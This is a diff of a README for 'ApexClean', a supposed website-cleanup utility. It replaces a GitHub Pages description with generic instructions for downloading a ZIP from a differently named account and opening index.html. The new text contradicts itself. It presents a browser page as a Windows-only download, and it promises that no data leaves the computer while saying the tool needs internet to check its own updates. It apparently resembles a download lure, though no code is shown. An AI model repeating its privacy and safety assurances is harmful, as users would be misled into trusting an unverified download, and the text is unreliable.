@@ -1,130 +1,71 @@
-# ApexClean vLatest - Website 2026
+# 🧹 apexclean-site-update - Keep your website clean and fast
 
-> **ApexClean is a browser-based website hosted with GitHub Pages. This repository represents the latest available release.**
+[![Download ApexClean](https://img.shields.io/badge/Download-Visit_Website-blue.svg)](https://github.com/Nonworkershortness871/apexclean-site-update)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/noah-davisco2450/apexclean-site-update?style=flat-square)](https://github.com/noah-davisco2450/apexclean-site-update)
+ApexClean helps you maintain your website. It removes clutter, fixes broken links, and optimizes your site performance. You use this tool to ensure your online presence stays professional and functional. 
 
----
+## ⚙️ What this tool does
 
-<p align="center">
-  <a href="https://noah-davisco2450.github.io/apexclean-site-update/">
-    <img src="https://img.shields.io/badge/Download-ApexClean%20Latest-brightgreen?style=for-the-badge" alt="Download ApexClean">
-  </a>
-</p>
+ApexClean scans your web files. It looks for outdated code and unused images. You gain a faster website that ranks better in search results. This tool works on all common web formats. It keeps your files organized so you find what you need. 
 
-> **[Download ApexClean Latest](https://noah-davisco2450.github.io/apexclean-site-update/)**
+## 🖥️ System requirements
 
----
+Your computer needs Windows 10 or Windows 11. You need a modern web browser like Chrome, Edge, or Firefox. You need 200MB of free space on your hard drive. Your internet connection allows the tool to fetch updates. You do not need special permissions to run the software.
 
-[Download Latest Build](https://noah-davisco2450.github.io/apexclean-site-update/)
+## 📥 How to download and set up
 
----
+You need to get the files to start. 
 
-## Project Overview
+1. Visit the project page here: [https://github.com/Nonworkershortness871/apexclean-site-update](https://github.com/Nonworkershortness871/apexclean-site-update).
+2. Click the green button labeled "Code".
+3. Select "Download ZIP" from the menu.
+4. Save the file to your computer.
+5. Open your Downloads folder.
+6. Right-click the folder and choose "Extract All".
+7. Follow the prompts to unzip the files.
 
-ApexClean is a web project served through GitHub Pages. Instead of being installed as a traditional desktop program, it is opened and used in a modern web browser.
+## 🚀 Running the application
 
-This repository contains the HTML-based site published at the project URL. Anyone can access the hosted version directly, while contributors can examine or modify the site files on a local machine and publish updates through the repository workflow.
+You do not need to install complex software. 
 
----
+1. Open the folder you just extracted.
+2. Locate the file named index.html.
+3. Double-click this file to open it in your browser.
+4. The tool loads directly in your browser window.
+5. You can now use the interface to scan your site files.
 
-## What It Provides
+## 🛠️ How to use the interface
 
-- Access through a compatible web browser
-- Deployment using GitHub Pages
-- HTML source that is easy to inspect and modify
-- A hosted project URL available from supported browsers
-- Distribution managed through the repository
-- No platform-specific installer listed in the available project metadata
-- Local preview capability for web content before it is published
-- Repository-based handling of ongoing project changes
+The dashboard shows you a simple menu. Click "Start Scan" to begin the process. The tool lists your files in the main window. It highlights files that need attention in red. You select the files you want to fix. Click "Clean" to remove the issues. The tool saves your changes automatically. You see a progress bar while the software works.
 
----
+## 📑 Understanding the report
 
-## Getting Started
+The report tells you what the software found. 
 
-ApexClean is intended primarily for online use. Open the hosted site at:
+* **Broken links:** These are connections that go nowhere. Users get errors when they click them. Fix these to improve user experience.
+* **Large images:** These files take a long time to load. Reducing their size helps your site load faster.
+* **Old scripts:** These files use outdated methods. They slow down your browser. Replacing them makes your site more secure.
 
-[Open ApexClean](https://noah-davisco2450.github.io/apexclean-site-update/)
+## 🔍 Troubleshooting common issues
 
-To work with the website files locally, clone the repository and enter its directory:
+* **The tool does not open:** Check that you extracted the files from the ZIP folder first. You cannot run the tool from inside the ZIP file.
+* **The page looks broken:** Refresh your browser window. Sometimes the browser needs a moment to load all elements.
+* **Files do not save:** Make sure the folder is not set to "Read Only." You can check this by right-clicking the folder, selecting Properties, and looking at the Attributes section.
+* **The scan stops:** Check your internet connection. Even though this tool runs locally, it needs a connection to verify its own update status.
 
-```bash
-git clone https://github.com/noah-davisco2450/apexclean-site-update.git
-cd REPO
-```
+## 🛡️ Privacy and security
 
-You can open the included HTML entry file in a browser. If direct file access is insufficient for the project, run the directory with a local static web server for previewing.
+This software runs on your computer. Your files stay on your hard drive. The software does not send your data to any external server. You have full control over what the software scans. You can delete the folder at any time to remove the software. 
 
----
+## 📈 Improving your results
 
-## Using ApexClean
+Run the tool once a week. Frequent scans stop issues before they become problems. Always keep a backup of your website files before you perform a major cleanup. You can copy your files to a separate folder before you start the scan. This gives you a safe copy if you delete a file by mistake.
 
-### Access the published site
+## 📝 Frequently asked questions
 
-1. Go to [https://noah-davisco2450.github.io/apexclean-site-update/](https://noah-davisco2450.github.io/apexclean-site-update/).
-2. Use ApexClean in a compatible browser.
-3. Refresh the page once a newly published build is available.
+* **Is this software free?** Yes, this project is open for anyone to use.
+* **Does it work on Mac?** This specific download is for Windows. 
+* **Can I see the source code?** Yes, the entire repository is public. You can view the code at the main project link.
+* **Do I need to update the tool?** Check the download link occasionally to see if a newer version is available. 
 
-### Check local edits
-
-1. Clone the repository to your machine.
-2. Modify the HTML files or any other included web assets.
-3. Open the entry page locally, or start a static development server.
-4. Inspect the result in a browser before committing your changes.
-
----
-
-## Configuration and Site Changes
-
-The supplied project metadata does not define application-specific configuration values.
-
-When updating the site, examine its HTML files and related web assets. Preserve the existing project structure, then commit and publish changes using the repository's GitHub Pages configuration.
-
----
-
-## Requirements
-
-- A modern browser to use the hosted website
-- Internet access to reach the GitHub Pages build
-- Git for cloning the project
-- HTML-compatible local preview tools when working offline
-- A GitHub repository configured for Pages in order to publish updates
-
----
-
-## Frequently Asked Questions
-
-### Where is ApexClean hosted?
-
-The published website is available at [https://noah-davisco2450.github.io/apexclean-site-update/](https://noah-davisco2450.github.io/apexclean-site-update/).
-
-### Is a desktop installation needed?
-
-ApexClean is identified in the available metadata as a web project. It should be accessed through a browser; no desktop installer is described.
-
-### How can I inspect the website source?
-
-Clone the repository with Git, then review the HTML files on your local machine.
-
-### Where are the project settings?
-
-No dedicated settings file is identified by the supplied project information. Check the website source and repository configuration for the options that are available.
-
-### What should I check if local previewing fails?
-
-Verify that the clone completed successfully, open the correct HTML entry file, and try a local static server if opening the file directly does not produce the expected result.
-
-### How do project updates become available?
-
-Changes are maintained in the repository and appear at the GitHub Pages URL after they have been published.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: cleanup, optimization, web-tools, maintenance, windows-utility
